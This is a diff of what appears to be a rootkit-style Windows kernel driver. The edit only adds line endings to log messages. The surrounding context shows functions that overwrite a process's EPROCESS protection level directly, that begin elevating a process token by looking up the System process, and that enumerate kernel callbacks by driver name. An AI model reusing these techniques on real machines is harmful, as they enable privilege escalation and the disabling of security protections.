@@ -217,7 +217,7 @@ BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritte
 NTSTATUS
 BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
 {
-    LOG_MSG("Changing pid %i protection to %i", pid, newProtectionLevel);
+    LOG_MSG("Changing pid %i protection to %i\r\n", pid, newProtectionLevel);
 
     // Lookup process
     PEPROCESS process = BeGetEprocessByPid(pid);
@@ -229,12 +229,12 @@ BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
 
     ULONG_PTR EProtectionLevel = (ULONG_PTR)process + BeGetEprocessProcessProtectionOffset();
 
-    LOG_MSG("Current protection level: %i", *((BYTE*)(EProtectionLevel)));
+    LOG_MSG("Current protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));
 
     // assign new protection level
     *((BYTE*)(EProtectionLevel)) = newProtectionLevel;
 
-    LOG_MSG("New protection level: %i", *((BYTE*)(EProtectionLevel)));
+    LOG_MSG("New protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));
 
     ObDereferenceObject(process);
     return STATUS_SUCCESS;
@@ -320,7 +320,7 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
     if (NtStatus != 0)
     {
-        LOG_MSG("PID %i not found", HandleToUlong(pid));
+        LOG_MSG("PID %i not found\r\n", HandleToUlong(pid));
         ObDereferenceObject(targetProcess);
         return NtStatus;
     }
@@ -329,7 +329,7 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     NtStatus = PsLookupProcessByProcessId((HANDLE)4, &privilegedProcess);
     if (NtStatus != 0)
     {
-        LOG_MSG("System process not found with pid 4");
+        LOG_MSG("System process not found with pid 4\r\n");
         ObDereferenceObject(privilegedProcess);
         ObDereferenceObject(targetProcess);
         return NtStatus;
@@ -421,7 +421,7 @@ NTSTATUS
 BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
 {
     NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
-    LOG_MSG("IOCTL enumerate callbacks");
+    LOG_MSG("IOCTL enumerate callbacks\r\n");
 
     __try
     {
@@ -445,12 +445,12 @@ BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoSt
                     if (!BeIsStringNull(callbackVector[i].driverName))
                     {
                         SIZE_T strLen = wcslen(callbackVector[i].driverName) + 1;
-                        DbgPrint("Size: %i of %ws", strLen, callbackVector[i].driverName);
+                        DbgPrint("Size: %i of %ws\r\n", strLen, callbackVector[i].driverName);
                         RtlCopyMemory(&(pOutputBuffer[i].driverName), callbackVector[i].driverName, strLen * sizeof(WCHAR));
                     }
                 }
 
-                LOG_MSG("Copied");
+                LOG_MSG("Copied\r\n");
 
                 //RtlCopyMemory(pOutputBuffer, pOutputBuffer, dwDataSize);
                 *pdwDataWritten = dwDataSize;
